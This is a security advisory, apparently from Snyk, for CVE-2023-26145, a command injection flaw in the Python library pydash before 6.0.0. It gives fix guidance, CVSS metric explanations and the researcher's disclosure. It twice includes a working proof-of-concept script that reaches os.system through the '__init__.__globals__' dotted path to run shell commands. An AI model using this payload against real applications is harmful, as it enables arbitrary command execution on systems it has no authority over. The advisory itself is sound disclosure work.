[CVE-2023-26145  (opens in a new tab)](https://www.cve.org/CVERecord?id=CVE-2023-26145) Common Vulnerabilities and Exposures (CVE) are common identifiers for publicly known security vulnerabilities[CWE-78  (opens in a new tab)](https://cwe.mitre.org/data/definitions/78.html) Common Weakness Enumeration (CWE) is a category system for software weaknesses First added by Snyk
## How to fix?

Upgrade `pydash` to version 6.0.0 or higher.

## Overview

[pydash](https://pypi.org/project/pydash) is a The kitchen sink of Python utility libraries for doing "stuff" in a functional way. Based on the Lo-Dash Javascript library.

Affected versions of this package are vulnerable to Command Injection. A number of pydash methods such as `pydash.objects.invoke()` and `pydash.collections.invoke_map()` accept dotted paths (Deep Path Strings) to target a nested Python object, relative to the original source object. These paths can be used to target internal class attributes and dict items, to retrieve, modify or invoke nested Python objects.

**Note:**

The `pydash.objects.invoke()` method is vulnerable to Command Injection when the following prerequisites are satisfied:

1. The source object (argument 1) is not a built-in object such as list/dict (otherwise, the `__init__.__globals__` path is not accessible)
2. The attacker has control over argument 2 (the path string) and argument 3 (the argument to pass to the invoked method)

The `pydash.collections.invoke_map()` method is also vulnerable, but is harder to exploit as the attacker does not have direct control over the argument to be passed to the invoked function.

## PoC

```
import sys
import random

import pydash

class Animal:
    def __init__(self, typ, age):
        self.type = typ
        self.age = age
        self.id = random.randint(1, 99999)

def poc(path, arg):
    """
        Use a malicious path to execute code via the __init__.__globals__ dict (not available with dict/list input objects?)
        I.e: pydash.invoke(obj, '__init__.__globals__.random._os.system', 'id')
    """

    obj = Animal('cat', 11)
    res = pydash.invoke(obj, path, arg)
    print(res)

if __name__ == '__main__':
    if len(sys.argv) < 3:
        print('Missing args: %s <path> <arg>' % sys.argv[0])
        sys.exit(1)
    poc(sys.argv[1], sys.argv[2])

```

### CVSS Scores

version 3.1
### Snyk

7.4 high

* Attack Vector (AV)

  The vulnerable component is bound to the network stack and the set of possible attackers extends beyond the other options listed below, up to and including the entire Internet. Such a vulnerability is often termed “remotely exploitable” and can be thought of as an attack being exploitable *at the protocol level* one or more network hops away (e.g., across one or more routers).

  **Network**
* Attack Complexity (AC)

  A successful attack depends on conditions beyond the attacker's control. That is, a successful attack cannot be accomplished at will, but requires the attacker to invest in some measurable amount of effort in preparation or execution against the vulnerable component before a successful attack can be expected.

  **High**
* Privileges Required (PR)

  The attacker is unauthorized prior to attack, and therefore does not require any access to settings or files of the vulnerable system to carry out an attack.

  **None**
* User Interaction (UI)

  The vulnerable system can be exploited without interaction from any user.

  **None**

* Scope (S)

  An exploited vulnerability can only affect resources managed by the same security authority. In this case, the vulnerable component and the impacted component are either the same, or both are managed by the same security authority.

  **Unchanged**

* Confidentiality (C)

  There is a total loss of confidentiality, resulting in all resources within the impacted component being divulged to the attacker. Alternatively, access to only some restricted information is obtained, but the disclosed information presents a direct, serious impact. For example, an attacker steals the administrator's password, or private encryption keys of a web server.

  **High**
* Integrity (I)

  There is a total loss of integrity, or a complete loss of protection. For example, the attacker is able to modify any/all files protected by the impacted component. Alternatively, only some files can be modified, but malicious modification would present a direct, serious consequence to the impacted component.

  **High**
* Availability (A)

  There is no impact to availability within the impacted component.

  **None**

## pydash v5.1.2 Code Injection

### Disclosure Status

I have already disclosed this to the maintainer, who issued a fix in version 6.0.0 (<https://pypi.org/project/pydash/6.0.0/>). I'd like to request a CVE be assigned for this vulnerability.

### Technical Details:

A number of pydash methods accept dotted paths (Deep Path Strings) to target a nested Python object, relative to the original source object. These paths can be used to target internal class attributes and dict items, to retrieve, modify or invoke nested Python objects.

From my research I have identified that the `pydash.objects.invoke()` method (<https://pydash.readthedocs.io/en/latest/api.html#pydash.objects.invoke>) is vulnerable to Command Injection when the following prerequisites are satisfied:

1. The source object (argument 1) is not a built-in object such as list/dict (otherwise, the `__init__.__globals__` path is not accessible)
2. The attacker has control over argument 2 (the path string) and argument 3 (the argument to pass to the invoked method)

When these prerequisites are met, the attacker can pass an arbitrary path i.e. `__init__.__globals__.random._os.system` to call `os.system()` with an attacker supplied argument i.e. 'id'.

To a lesser extent, the `pydash.collections.invoke_map()` method is also vulnerable, but is harder to exploit as the attacker does not have direct control over the argument to be passed to the invoked function. If it was possible to manipulate the collection to contain an attacker controlled value, Command Injection is likely also possible.

### Proof Of Concept/Steps to Reproduce:

The PoC script below demonstrates this issue, run the script with a malicious dotted path and the string argument to be passed to the invoked function i.e: `python pdash.py __init__.__globals__.random._os.system id`

```
import sys
import random

import pydash

class Animal:
    def __init__(self, typ, age):
        self.type = typ
        self.age = age
        self.id = random.randint(1, 99999)

def poc(path, arg):
    """
        Use a malicious path to execute code via the __init__.__globals__ dict (not available with dict/list input objects?)
        I.e: pydash.invoke(obj, '__init__.__globals__.random._os.system', 'id')
    """

    obj = Animal('cat', 11)
    res = pydash.invoke(obj, path, arg)
    print(res)

if __name__ == '__main__':
    if len(sys.argv) < 3:
        print('Missing args: %s <path> <arg>' % sys.argv[0])
        sys.exit(1)
    poc(sys.argv[1], sys.argv[2])
```
